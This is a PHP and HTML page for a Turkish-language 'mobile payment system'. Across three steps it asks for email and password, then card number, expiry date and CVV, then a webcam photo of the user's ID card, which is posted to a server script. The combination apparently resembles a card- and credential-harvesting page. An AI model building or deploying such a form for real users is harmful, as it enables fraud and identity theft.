<?php 
require_once 'baglanti.php';
?>

<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>CodePen - Multi Step Form Wizard in VanillaJS</title>
  <link rel="stylesheet" href="./style.css">
  <style type="text/css">

    button {
        width: 120px;
        padding: 10px;
        display: block;
        margin: 20px auto;
        border: 2px solid #111111;
        cursor: pointer;
        background-color: white;
    }

    #start-camera {
        margin-top: 50px;
    }

    #video {
        display: none;
        margin: 50px auto 0 auto;
    }

    #click-photo {
        display: none;
    }

    #dataurl-container {
        display: none;
    }

    #canvas {
        display: block;
        margin: 0 auto 20px auto;
    }

    #dataurl-header {
        text-align: center;
        font-size: 15px;
    }

    #dataurl {
        display: block;
        height: 100px;
        width: 320px;
        margin: 10px auto;
        resize: none;
        outline: none;
        border: 1px solid #111111;
        padding: 5px;
        font-size: 13px;
        box-sizing: border-box;
    }
  

</style>
</head>

    <body>

        <main>
            <div class="fw">
                <h1 class="fw__title">YEMITECH</h1>
                <h2 class="fw__title">Mobilde Ödeme Sistemi</h2>

                <div class="fw__progress">
                    <ul class="fw__breadcrumbs">
                        <li class="fw__breadcrumbs__item">
                            <div class="fw__breadcrumbs__element">1</div>
                        </li>
                        <li class="fw__breadcrumbs__item">
                            <div class="fw__breadcrumbs__element">2</div>
                        </li>
                        <li class="fw__breadcrumbs__item">
                            <div class="fw__breadcrumbs__element">3</div>
                        </li>
                        <li class="fw__breadcrumbs__item">
                            <div class="fw__breadcrumbs__element"><span class="done"></span></div>
                        </li>
                    </ul>
                </div>

                <form id="form" class="fw__wrapper" novalidate>
                    <fieldset class="fw__inputs fw__step">
                       <h4 class="fw__result__title">Giriş bilgilerinizi giriniz</h4>


                       <input type="email" name="email" placeholder="E-mail" data-validation="email" data-label="Email" />

                       <input type="password" name="sifre" placeholder="Şifre" data-label="Şifre" data-validation="phone"/>




                       <div class="fw__inputs__error"><p class="fw__inputs__error--message"></p></div>



                       <input class="fw__button" type="button" value="İleri" onclick="next()"/>

                   </fieldset>


                   <fieldset class="fw__inputs fw__step">
                     <h4 class="fw__result__title">Hesap bilgilerinizi giriniz</h4>

                     <input type="text" name="kartno" placeholder="Kart numarasını giriniz" data-validation="Kart Numarası" data-label="Kart No" />

                     <input type="text" name="skt" placeholder="SKT" data-label="SKT" data-validation="SKT"/>

                     <input type="text" name="cvv" placeholder="CVV" data-label="CVV" data-validation="CVV"/>





                     <div class="fw__inputs__error"><p class="fw__inputs__error--message"></p></div>

                     <input class="fw__button" type="button" value="İleri" onclick="next()"/>
                 </fieldset>

                 <fieldset class="fw__inputs fw__step">
                     <h4 class="fw__result__title">Tc kimlik kartınızdaki fotoğrafınızı kameraya gözükecek şekilde tanımlayınız</h4>

                    <!-- kamera bölümü-->

                     <input type="button" name="start_camera" id="start-camera" value="Kamerayı Başlat">
                     <video id="video" width="320" height="240" autoplay></video>
                     <input type="button" name="click_camera" id="click-photo" value="Fotoğraf Çek">

                     <div id="dataurl-container">
                        <canvas id="canvas" width="320" height="240"></canvas>       
                    </div>

                    <!-- /kamera bölümü-->

                    <div class="fw__inputs__error"><p class="fw__inputs__error--message"></p></div>


                    <input id="submit" class="fw__button" type="submit" value="Gönder"/>
                    <input class="fw__button fw__button--negative" type="button" value="Geri" onclick="back()"/>
                    
                </fieldset>

                <section class="fw__result fw__step">
                    <h4 class="fw__result__title">Kayıt Detayı:</h4>

                    <div id="results"></div>

                    <input class="fw__button fw__result__button" type="button" value="Onayla" onclick="init()">

                </section>
            </form>

        </div>
    </main>

    <script src="js/index.js"></script>
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
</body>

</html>
<!-- partial -->
<script>

    let camera_button = document.querySelector("#start-camera");
    let video = document.querySelector("#video");
    let click_button = document.querySelector("#click-photo");
    let canvas = document.querySelector("#canvas");
    let dataurl = document.querySelector("#dataurl");
    let dataurl_container = document.querySelector("#dataurl-container");


    camera_button.addEventListener('click', async function() {
        let stream = null;

        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        }
        catch(error) {
            alert(error.message);
            return;
        }

        video.srcObject = stream;

        video.style.display = 'block';
        camera_button.style.display = 'none';
        click_button.style.display = 'block';
    });

    click_button.addEventListener('click', function() {
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        let image_data_url = canvas.toDataURL('image/jpeg');
        $.ajax(
        {
            type: "POST",
            url: 'islem.php',
            data: {image_data_url},
            success: function (data)
                    {
                        //gelen sonuc
                        alert("TRUE");
                    },
        }
       );
       
        dataurl_container.style.display = 'block';
    });

</script>
<script  src="./script.js"></script>

</body>
</html>
